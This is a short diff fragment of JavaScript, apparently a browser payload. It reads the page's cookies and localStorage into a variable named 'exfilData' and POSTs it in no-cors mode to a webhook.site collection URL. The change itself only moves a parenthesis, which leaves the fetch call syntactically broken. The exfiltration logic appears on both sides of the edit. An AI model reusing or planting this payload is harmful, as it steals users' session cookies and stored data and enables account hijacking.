@@ -12,7 +12,7 @@ var userStorage = JSON.stringify(localStorage);
 
 var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;
 
-fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49ae/", {
+fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49ae/"), {
     method: "POST",    
     mode: "no-cors",     
     body: exfilData       
